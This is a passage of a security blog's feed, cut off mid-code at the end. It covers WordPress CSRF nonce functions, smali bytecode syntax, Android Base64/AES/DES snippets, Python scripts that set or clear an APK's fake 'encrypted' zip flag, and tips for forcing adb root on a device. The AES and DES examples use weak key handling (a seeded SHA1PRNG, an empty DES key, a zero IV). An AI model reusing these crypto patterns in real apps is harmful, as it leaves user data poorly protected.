+<h3 id="0x07-CSRF"><a href="#0x07-CSRF" class="headerlink" title="0x07 CSRF"></a>0x07 CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wp_nonce_field()</span><br><span class="line">wp_nonce_url()</span><br><span class="line">wp_verify_nonce()</span><br><span class="line">check_admin_referer()</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-XSS&quot;&gt;&lt;a href=&quot;#0x01-XSS&quot; class=&quot;headerlink&quot; title=&quot;0x01 XSS&quot;&gt;&lt;/a&gt;0x01 XSS&lt;/h3&gt;&lt;h4 id=&quot;function&quot;&gt;&lt;a href=&quot;#function&quot; class=&quot;head
+    
+    </summary>
+    
+    
+      <category term="Cheat Sheet" scheme="http://blog.safebuff.com/tags/Cheat-Sheet/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>smali wiki</title>
+    <link href="http://blog.safebuff.com/2016/09/22/smali-wiki/"/>
+    <id>http://blog.safebuff.com/2016/09/22/smali-wiki/</id>
+    <published>2016-09-22T07:08:16.000Z</published>
+    <updated>2016-09-22T17:21:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-TypesMethodsAndFields"><a href="#0x01-TypesMethodsAndFields" class="headerlink" title="0x01 TypesMethodsAndFields"></a>0x01 TypesMethodsAndFields</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><blockquote>
+<p><strong>原始类型</strong></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>value</th>
+<th>description </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>V</td>
+<td>void - can only be used for return types</td>
+</tr>
+<tr>
+<td>Z</td>
+<td>boolean</td>
+</tr>
+<tr>
+<td>B</td>
+<td>byte</td>
+</tr>
+<tr>
+<td>S</td>
+<td>short</td>
+</tr>
+<tr>
+<td>C</td>
+<td>char</td>
+</tr>
+<tr>
+<td>I</td>
+<td>int</td>
+</tr>
+<tr>
+<td>J</td>
+<td>long (64 bits)</td>
+</tr>
+<tr>
+<td>F</td>
+<td>float</td>
+</tr>
+<tr>
+<td>D</td>
+<td>double (64 bits)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>对象</strong></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lpackage/name/ObjectName;   &lt;==&gt; package.name.ObjectName;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>value</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>L</td>
+<td>表示这是一个对象类型</td>
+</tr>
+<tr>
+<td>package/name</td>
+<td>该对象所在的包</td>
+</tr>
+<tr>
+<td>ObjectName</td>
+<td>对象名称</td>
+</tr>
+<tr>
+<td>;</td>
+<td>标识对象名称的结束</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>数组</strong></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[|          ==&gt; 表示一个int型的一维数组，相当于int[]</span><br><span class="line">[[|         ==&gt; int[][]，数组每一个维度最多255个;</span><br><span class="line">对象数组    ==&gt; 如String数组的表示是[Ljava/lang/String</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>寄存器与变量</strong></p>
+</blockquote>
+<p>寄存器采用v和p来命名,v表示本地寄存器,p表示参数寄存器,如果一个方法有两个本地变量，有三个参数:</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>v0</td>
+<td>第一个本地寄存器</td>
+</tr>
+<tr>
+<td>v1</td>
+<td>第二个本地寄存器</td>
+</tr>
+<tr>
+<td>v2</td>
+<td>p0 (this)</td>
+</tr>
+<tr>
+<td>v3</td>
+<td>p1 第一个参数</td>
+</tr>
+<tr>
+<td>v4</td>
+<td>p2 第二个参数</td>
+</tr>
+<tr>
+<td>v5</td>
+<td>p3 第三个参数</td>
+</tr>
+</tbody>
+</table>
+<p>＊如果是静态方法的话就只有5个寄存器了，不需要存this了。</p>
+<p>.registers 使用这个指令指定方法中寄存器的总数</p>
+<p>.locals 使用这个指定表明方法中非参寄存器的总数，放在方法的第一行。</p>
+<h4 id="方法和字段"><a href="#方法和字段" class="headerlink" title="方法和字段"></a>方法和字段</h4><blockquote>
+<p><strong>方法签名</strong></p>
+</blockquote>
+<p>methodName(III)Lpackage/name/ObjectName;</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>methodName</td>
+<td>方法名</td>
+</tr>
+<tr>
+<td>III</td>
+<td>三个整形参数</td>
+</tr>
+<tr>
+<td>Lpackage/name/ObjectName;</td>
+<td>返回值的类型</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>方法</strong></p>
+</blockquote>
+<p>Lpackage/name/ObjectName;——&gt;methodName(III)Z    ==&gt; function boolean methondName(int a, int b, int c)</p>
+<blockquote>
+<p><strong>字段</strong></p>
+</blockquote>
+<p>Lpackage/name/ObjectName;——&gt;FieldName:Ljava/lang/String;</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Lpackage/name/ObjectName;</td>
+<td>包名</td>
+</tr>
+<tr>
+<td>FieldName</td>
+<td>字段名</td>
+</tr>
+<tr>
+<td>Ljava/lang/String;</td>
+<td>字段类型</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>方法的定义</strong></p>
+</blockquote>
+<p><strong>编译前</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static int sum(int a, int b) &#123;</span><br><span class="line">        return a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>编译后</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.method private static sum(II)I</span><br><span class="line">    .locals 4   #表示需要申请4个本地寄存器</span><br><span class="line">    .parameter</span><br><span class="line">    .parameter #这里表示有两个参数</span><br><span class="line">    .prologue</span><br><span class="line">    .line 27 </span><br><span class="line">    move v0, p0</span><br><span class="line">    .local v0, a:I</span><br><span class="line">    move v1, p1</span><br><span class="line">    .local v1, b:I</span><br><span class="line">    move v2, v0</span><br><span class="line">    move v3, v1</span><br><span class="line">    add-int/2addr v2, v3</span><br><span class="line">    move v0, v2</span><br><span class="line">    .end local v0           #a:I</span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure></p>
+<p>函数声明使用.method开始 .end method结束，java中的关键词private,static 等都可以使用，同时使用sum(II)I签名来表示唯一的方法</p>
+<blockquote>
+<p><strong>声明成员</strong></p>
+</blockquote>
+<p>.field private name:Lpackage/name/ObjectName;</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>private TextView mTextView;</td>
+<td>.field private mTextView:Landroid/widget/TextView;</td>
+</tr>
+<tr>
+<td>private int mCount;</td>
+<td>.field private mCount:I</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>指令执行</strong></p>
+</blockquote>
+<p>example:</p>
+<p>move v0, v3     #把v3寄存器的值移动到寄存器v0上</p>
+<p>const v0, 0x1  #把值0x1赋值到寄存器v0上</p>
+<p>invoke-static {v4, v5}, Lme/isming/myapplication/MainActivity;-&gt;sum(II)I    </p>
+<p>#执行方法sum(),v4,v5的值分别作为sum的参数</p>
+<h3 id="0x02-smali基本语法"><a href="#0x02-smali基本语法" class="headerlink" title="0x02 smali基本语法"></a>0x02 smali基本语法</h3><table>
+<thead>
+<tr>
+<th>value</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>.field private isFlag:z　</td>
+<td>　定义变量</td>
+</tr>
+<tr>
+<td>.method　</td>
+<td>　方法</td>
+</tr>
+<tr>
+<td>.parameter　</td>
+<td>　方法参数</td>
+</tr>
+<tr>
+<td>.prologue　</td>
+<td>　方法开始</td>
+</tr>
+<tr>
+<td>.line 12　</td>
+<td>　此方法位于第12行</td>
+</tr>
+<tr>
+<td>invoke-super　</td>
+<td>　调用父函数</td>
+</tr>
+<tr>
+<td>const/high16  v0, 0x7fo3　</td>
+<td>　把0x7fo3赋值给v0</td>
+</tr>
+<tr>
+<td>invoke-direct　</td>
+<td>　调用函数</td>
+</tr>
+<tr>
+<td>return-void　</td>
+<td>　函数返回void</td>
+</tr>
+<tr>
+<td>.end method　</td>
+<td>　函数结束</td>
+</tr>
+<tr>
+<td>new-instance　</td>
+<td>　创建实例</td>
+</tr>
+<tr>
+<td>iput-object　</td>
+<td>　对象赋值</td>
+</tr>
+<tr>
+<td>iget-object　</td>
+<td>　调用对象</td>
+</tr>
+<tr>
+<td>invoke-static　</td>
+<td>　调用静态函数</td>
+</tr>
+</tbody>
+</table>
+<h3 id="0x03-条件跳转分支"><a href="#0x03-条件跳转分支" class="headerlink" title="0x03 条件跳转分支"></a>0x03 条件跳转分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;if-eq vA, vB, :cond_**&quot;   如果vA等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-ne vA, vB, :cond_**&quot;   如果vA不等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-lt vA, vB, :cond_**&quot;    如果vA小于vB则跳转到:cond_**</span><br><span class="line">&quot;if-ge vA, vB, :cond_**&quot;   如果vA大于等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-gt vA, vB, :cond_**&quot;   如果vA大于vB则跳转到:cond_**</span><br><span class="line">&quot;if-le vA, vB, :cond_**&quot;    如果vA小于等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-eqz vA, :cond_**&quot;   如果vA等于0则跳转到:cond_**</span><br><span class="line">&quot;if-nez vA, :cond_**&quot;   如果vA不等于0则跳转到:cond_**</span><br><span class="line">&quot;if-ltz vA, :cond_**&quot;    如果vA小于0则跳转到:cond_**</span><br><span class="line">&quot;if-gez vA, :cond_**&quot;   如果vA大于等于0则跳转到:cond_**</span><br><span class="line">&quot;if-gtz vA, :cond_**&quot;   如果vA大于0则跳转到:cond_**</span><br><span class="line">&quot;if-lez vA, :cond_**&quot;    如果vA小于等于0则跳转到:cond_**</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-TypesMethodsAndFields&quot;&gt;&lt;a href=&quot;#0x01-TypesMethodsAndFields&quot; class=&quot;headerlink&quot; title=&quot;0x01 TypesMethodsAndFields&quot;&gt;&lt;/a&gt;0x01 Typ
+    
+    </summary>
+    
+    
+      <category term="smali" scheme="http://blog.safebuff.com/tags/smali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android Encrypt and Decrypt</title>
+    <link href="http://blog.safebuff.com/2016/09/22/Android-Encrypt-and-Decrypt/"/>
+    <id>http://blog.safebuff.com/2016/09/22/Android-Encrypt-and-Decrypt/</id>
+    <published>2016-09-22T03:15:19.000Z</published>
+    <updated>2016-09-22T06:19:57.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h3><blockquote>
+<p>Encrypt</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import android.util.Base64;</span><br><span class="line">String str = &quot;hello world&quot;;</span><br><span class="line">String base64str = Base64.encodeToString(str.getBytes(),Base64.DEFAULT);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Decrypt</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] m = Base64.decode(base64str,Base64.DEFAULT);</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-AES"><a href="#0x02-AES" class="headerlink" title="0x02 AES"></a>0x02 AES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import java.security.SecureRandom;</span><br><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.KeyGenerator;</span><br><span class="line">import javax.crypto.SecretKey;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line">/**</span><br><span class="line"> * Usage:</span><br><span class="line"> * &lt;pre&gt;</span><br><span class="line"> * String crypto = SimpleCrypto.encrypt(masterpassword, cleartext)</span><br><span class="line"> * String cleartext = SimpleCrypto.decrypt(masterpassword, crypto)</span><br><span class="line"> * &lt;/pre&gt;</span><br><span class="line"> */</span><br><span class="line">public class SimpleCrypto &#123;</span><br><span class="line">    public static String encrypt(String seed, String cleartext)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        byte[] rawKey = getRawKey(seed.getBytes());</span><br><span class="line">        byte[] result = encrypt(rawKey, cleartext.getBytes());</span><br><span class="line">        return toHex(result);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String decrypt(String seed, String encrypted)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        byte[] rawKey = getRawKey(seed.getBytes());</span><br><span class="line">        byte[] enc = toByte(encrypted);</span><br><span class="line">        byte[] result = decrypt(rawKey, enc);</span><br><span class="line">        return new String(result);</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] getRawKey(byte[] seed) throws Exception &#123;</span><br><span class="line">        KeyGenerator kgen = KeyGenerator.getInstance(&quot;AES&quot;);</span><br><span class="line">        SecureRandom sr = SecureRandom.getInstance(&quot;SHA1PRNG&quot;);</span><br><span class="line">        sr.setSeed(seed);</span><br><span class="line">        kgen.init(128, sr); // 192 and 256 bits may not be available</span><br><span class="line">        SecretKey skey = kgen.generateKey();</span><br><span class="line">        byte[] raw = skey.getEncoded();</span><br><span class="line">        return raw;</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] encrypt(byte[] raw, byte[] clear) throws Exception &#123;</span><br><span class="line">        SecretKeySpec skeySpec = new SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);</span><br><span class="line">        byte[] encrypted = cipher.doFinal(clear);</span><br><span class="line">        return encrypted;</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] decrypt(byte[] raw, byte[] encrypted)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        SecretKeySpec skeySpec = new SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, skeySpec);</span><br><span class="line">        byte[] decrypted = cipher.doFinal(encrypted);</span><br><span class="line">        return decrypted;</span><br><span class="line">    &#125;</span><br><span class="line">    public static String toHex(String txt) &#123;</span><br><span class="line">        return toHex(txt.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">    public static String fromHex(String hex) &#123;</span><br><span class="line">        return new String(toByte(hex));</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] toByte(String hexString) &#123;</span><br><span class="line">        int len = hexString.length() / 2;</span><br><span class="line">        byte[] result = new byte[len];</span><br><span class="line">        for (int i = 0; i &lt; len; i++)</span><br><span class="line">            result[i] = Integer.valueOf(hexString.substring(2 * i, 2 * i + 2),</span><br><span class="line">                    16).byteValue();</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    public static String toHex(byte[] buf) &#123;</span><br><span class="line">        if (buf == null)</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        StringBuffer result = new StringBuffer(2 * buf.length);</span><br><span class="line">        for (int i = 0; i &lt; buf.length; i++) &#123;</span><br><span class="line">            appendHex(result, buf[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    private final static String HEX = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">    private static void appendHex(StringBuffer sb, byte b) &#123;</span><br><span class="line">        sb.append(HEX.charAt((b &gt;&gt; 4) &amp; 0x0f)).append(HEX.charAt(b &amp; 0x0f));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-DES"><a href="#0x03-DES" class="headerlink" title="0x03 DES"></a>0x03 DES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class Des4 &#123;  </span><br><span class="line">    // 密钥  如果 密匙不足 8个 字符  java代码 要加 \0</span><br><span class="line">    // 例如 secretKey = &quot;xxxxxxx\0&quot;; </span><br><span class="line">    // 由于我们后台设置的密匙为7位，造成了一系列的麻烦，后经过查询php            // 文档解决，添加secretKey = &quot;xxxxxxx\0&quot;; </span><br><span class="line"></span><br><span class="line">    private final static String secretKey = &quot;&quot;;  </span><br><span class="line">    private static byte[] iv = &#123;0, 0, 0, 0, 0, 0, 0, 0&#125;;  </span><br><span class="line"></span><br><span class="line">    public static String encode(String plainText) throws Exception &#123;  </span><br><span class="line">        IvParameterSpec zeroIv = new IvParameterSpec(iv);  </span><br><span class="line">        SecretKeySpec key = new SecretKeySpec(secretKey.getBytes(), &quot;DES&quot;);  </span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;DES&quot;);  </span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, key, zeroIv);  </span><br><span class="line">        byte[] encryptedData = cipher.doFinal(plainText.getBytes());  </span><br><span class="line">        return Base64.encodeToString(encryptedData, 1);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    public static String decode(String encryptText) throws Exception &#123;  </span><br><span class="line">        IvParameterSpec zeroIv = new IvParameterSpec(iv);  </span><br><span class="line">        SecretKeySpec key = new SecretKeySpec(secretKey.getBytes(), &quot;DES&quot;);  </span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;DES&quot;);  </span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, key, zeroIv);  </span><br><span class="line">        byte[] decryptData = cipher.doFinal(Base64.decode(encryptText, 1));  </span><br><span class="line">        return new String(decryptData);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-apk伪加密"><a href="#0x04-apk伪加密" class="headerlink" title="0x04 apk伪加密"></a>0x04 apk伪加密</h3><blockquote>
+<p>pack</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line">from zipfile import ZipFile, ZipInfo</span><br><span class="line"></span><br><span class="line">class ApkFile(ZipFile):</span><br><span class="line">	def compress(self, member, src_apk):</span><br><span class="line">		if not isinstance(member, ZipInfo):</span><br><span class="line">			member = self.getinfo(member)</span><br><span class="line">		try:</span><br><span class="line">			data_obj = src_apk.open(member, &apos;r&apos;)</span><br><span class="line">			data = data_obj.read()</span><br><span class="line">		except RuntimeError, e:</span><br><span class="line">			print e</span><br><span class="line">			return</span><br><span class="line">		member.flag_bits |= 1</span><br><span class="line">		self.writestr(member, data)</span><br><span class="line">		print &apos;compressing %s&apos; % member.filename</span><br><span class="line">				</span><br><span class="line">	def compressall(self, src_apk):</span><br><span class="line">		map(lambda entry: self.compress(entry, src_apk), src_apk.filelist)</span><br><span class="line">				</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	parser = argparse.ArgumentParser(description=&apos;Add the encrypted flag to an APK. \</span><br><span class="line">	src_apk specifies the apk file you want to add encrypted flag, dst_apk is the output apk file.&apos;)</span><br><span class="line">	parser.add_argument(&apos;src_apk&apos;, type=str)</span><br><span class="line">	parser.add_argument(&apos;dst_apk&apos;, type=str)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	src_apk = ApkFile(args.src_apk, &apos;r&apos;)</span><br><span class="line">	dst_apk = ApkFile(args.dst_apk, &apos;w&apos;)</span><br><span class="line">	dst_apk.compressall(src_apk)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>unpack</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line">from zipfile import ZipFile, ZipInfo</span><br><span class="line"></span><br><span class="line">class ApkFile(ZipFile):</span><br><span class="line">	def extract(self, member, path=None, pwd=None):</span><br><span class="line">		if not isinstance(member, ZipInfo):</span><br><span class="line">			member = self.getinfo(member)</span><br><span class="line">		member.flag_bits ^= member.flag_bits%2</span><br><span class="line">		ZipFile.extract(self, member, path, pwd)</span><br><span class="line">		print &apos;extracting %s&apos; % member.filename</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">	def extractall(self, path=None, members=None, pwd=None):</span><br><span class="line">		map(lambda entry: self.extract(entry, path, pwd), members if members is not None  and len(members)&gt;0 else self.filelist)</span><br><span class="line">				</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	parser = argparse.ArgumentParser(description=&apos;unpacks an APK that contains files which are wrongly marked as encrypted&apos;)</span><br><span class="line">	parser.add_argument(&apos;apk&apos;, type=str)</span><br><span class="line">	parser.add_argument(&apos;file&apos;, type=str, nargs=&apos;*&apos;)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">	apk = ApkFile(args.apk,&apos;r&apos;)</span><br><span class="line">	apk.extractall(members=args.file)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Base64&quot;&gt;&lt;a href=&quot;#0x01-Base64&quot; class=&quot;headerlink&quot; title=&quot;0x01 Base64&quot;&gt;&lt;/a&gt;0x01 Base64&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Encrypt&lt;/p&gt;
+&lt;/blockqu
+    
+    </summary>
+    
+    
+      <category term="Android" scheme="http://blog.safebuff.com/tags/Android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android Debug Enable Tips</title>
+    <link href="http://blog.safebuff.com/2016/09/19/Android-Debug-Enable-Tips/"/>
+    <id>http://blog.safebuff.com/2016/09/19/Android-Debug-Enable-Tips/</id>
+    <published>2016-09-18T19:39:29.000Z</published>
+    <updated>2016-09-18T20:30:12.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-default-prop"><a href="#0x01-default-prop" class="headerlink" title="0x01 default.prop"></a>0x01 default.prop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; vi default.prop</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ro.debuggable=1</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-boot-img"><a href="#0x02-boot-img" class="headerlink" title="0x02 boot.img"></a>0x02 boot.img</h3><blockquote>
+<p>return secure ==&gt; return 0</p>
+</blockquote>
+<pre><code>vi /system/core/adb/adb.c
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">static int should_drop_privileges() &#123;</span><br><span class="line">#ifndef ALLOW_ADBD_ROOT</span><br><span class="line">    return 1;</span><br><span class="line">#else /* ALLOW_ADBD_ROOT */</span><br><span class="line">    int secure = 0;</span><br><span class="line">    char value[PROPERTY_VALUE_MAX];</span><br><span class="line"> </span><br><span class="line">   /* run adbd in secure mode if ro.secure is set and</span><br><span class="line">    ** we are not in the emulator</span><br><span class="line">    */</span><br><span class="line">    property_get(&quot;ro.kernel.qemu&quot;, value, &quot;&quot;);</span><br><span class="line">    if (strcmp(value, &quot;1&quot;) != 0) &#123;</span><br><span class="line">        property_get(&quot;ro.secure&quot;, value, &quot;1&quot;);</span><br><span class="line">        if (strcmp(value, &quot;1&quot;) == 0) &#123;</span><br><span class="line">            // don&apos;t run as root if ro.secure is set...</span><br><span class="line">            secure = 1;</span><br><span class="line"> </span><br><span class="line">            // ... except we allow running as root in userdebug builds if the</span><br><span class="line">            // service.adb.root property has been set by the &quot;adb root&quot; command</span><br><span class="line">            property_get(&quot;ro.debuggable&quot;, value, &quot;&quot;);</span><br><span class="line">            if (strcmp(value, &quot;1&quot;) == 0) &#123;</span><br><span class="line">                property_get(&quot;service.adb.root&quot;, value, &quot;&quot;);</span><br><span class="line">                if (strcmp(value, &quot;1&quot;) == 0) &#123;</span><br><span class="line">                    secure = 0;</span><br><span 